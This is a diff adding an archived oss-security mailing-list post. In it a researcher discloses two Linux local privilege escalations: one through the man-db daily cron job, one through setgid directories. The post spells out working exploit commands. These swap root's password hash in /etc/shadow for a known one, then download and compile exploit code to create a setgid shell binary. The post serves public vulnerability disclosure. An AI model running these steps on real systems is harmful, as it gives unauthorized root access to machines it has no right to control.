@@ -1,0 +1,226 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: User man Local Root Exploit/Linux Kernel setgid
+ Directory Privilege Escalation/PAM Owner Check Weakness</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="../../../2015/12/19/3">[&lt;prev]</a> <a href="../../../2015/12/21/1">[next&gt;]</a> <a href="../../../2015/12/15/13">[&lt;thread-prev]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;56753E45.6080707&#64;halfdog.net&gt;
+Date: Sat, 19 Dec 2015 11:23:49 +0000
+From: halfdog &lt;me&#64;...fdog.net&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: Re: User man Local Root Exploit/Linux Kernel setgid
+ Directory Privilege Escalation/PAM Owner Check Weakness
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Solar Designer wrote:
+&gt; halfdog -
+&gt; 
+&gt;&gt; <a href="http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/" rel="nofollow">http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/</a>
+&gt;&gt;
+&gt;&gt; 
+<a href="http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/" rel="nofollow">http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/</a>
+&gt; 
+&gt; Thank you for documenting these peculiar findings.  While your web
+&gt; pages are nicely formatted and have helpful cross-references, could
+&gt; you please post the actual content to oss-security directly? ...
+
+Sorry, forgot that. I think you mentioned it already in some other
+post on this list.
+
+!!! Just for reference, please ignore !!!
+
+The daily mandb cleanup job for old catman pages changes the
+permissions of all non-man files to user man. This happens e.g. under
+Ubuntu Vivid with /etc/cron.daily/man-db when systemd is not installed
+(/run/systemd/system does not exist). The problematic code is
+
+# expunge old catman pages which have not been read in a week
+if [ ! -d /run/systemd/system ] &amp;&amp; [ -d /var/cache/man ]; then
+  cd /
+  if ! dpkg-statoverride --list /var/cache/man &gt;/dev/null 2&gt;&amp;1; then
+    echo "Running find" &gt;&amp;2
+    find /var/cache/man -ignore_readdir_race ! -user man -print0 | \
+      xargs -r0 chown -f man || true
+  fi
+  start-stop-daemon --start --pidfile /dev/null --startas /bin/sh \
+        --oknodo --chuid man $iosched_idle -- -c \
+        "find /var/cache/man -type f -name '*.gz' -atime +6 -print0 | \
+         xargs -r0 rm -f"
+fi
+
+With <a href="https://www.halfdog.net/Misc/Utils/DirModifyInotify.c" rel="nofollow">https://www.halfdog.net/Misc/Utils/DirModifyInotify.c</a> this can be
+used to change owenership of /etc/shadow and escalate to root. To
+start, a hardlink to a file of a different user has to be created.
+
+man# mkdir -p /var/cache/man/etc
+man# ln /var/crash/.lock /var/cache/man/etc/shadow
+man# ./DirModifyInotify --Watch /var/cache/man/etc --WatchCount 0
+- --MovePath /var/cache/man/etc --LinkTarget /etc
+... Wait till daily cronjob was run
+man# cp /etc/shadow .
+man# sed -r -e
+'s/^root:.*/root:$1$kKBXcycA$w.1NUJ77AuKcSYYrjLn9s1:15462:0:99999:7:::/'
+/etc/shadow &gt; x
+man# cat x &gt; /etc/shadow; rm x
+man# su -s /bin/sh (password is 123)
+root# cat shadow &gt; /etc/shadow; chown root /etc/shadow
+
+Read more at
+<a href="http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/" rel="nofollow">http://www.halfdog.net/Security/2015/MandbSymlinkLocalRootPrivilegeEscalation/</a>
+
+
+
+
+On some Linux systems, directories with setgid bit set may be found,
+e.g. using find / -type d -perm -02000. On Ubuntu Vivid this includes
+
+drwxr-sr-x 25 man  root  4096 May 15 00:40 /var/cache/man
+
+Creating a file as user man/man with setgid-bit flags will produce a
+file with setgit bit really set but uid man/root. Normal writes will
+cause loss of setgid bit, but crafted writing allows to fill the file
+and hence escalate privileges to group root:
+
+man$ cd /var/cache/man
+man$ wget -q
+<a href="http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c" rel="nofollow">http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/CreateSetgidBinary.c</a>
+man$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
+man$ ./CreateSetgidBinary ./escalate /bin/mount x nonexistent-arg
+man$ ls -al ./escalate
+- -rwsrwsr-t 1 man root 155 May 15 02:12 ./escalate
+man$ ./escalate /bin/sh
+man$ ls -al /proc/self/
+total 0
+dr-xr-xr-x   9 man  root 0 May 15 02:13 .
+
+Read more at
+<a href="http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/" rel="nofollow">http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/</a>
+
+- -- 
+<a href="http://www.halfdog.net/" rel="nofollow">http://www.halfdog.net/</a>
+PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iEYEARECAAYFAlZ1PjoACgkQxFmThv7tq+6ouQCfZbKWiexcNN/iWNZb7Wc4Lhg1
+vXQAn10Rx8RZVDVlSB4haUTQfsMlE3dv
+=m9be
+-----END PGP SIGNATURE-----
+
+<span style="font-family: times;"><strong>View attachment "</strong><a href="1/1">CreateSetgidBinary.c</a><strong>" of type "</strong>text/x-csrc<strong>" (4289 bytes)</strong></span>
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
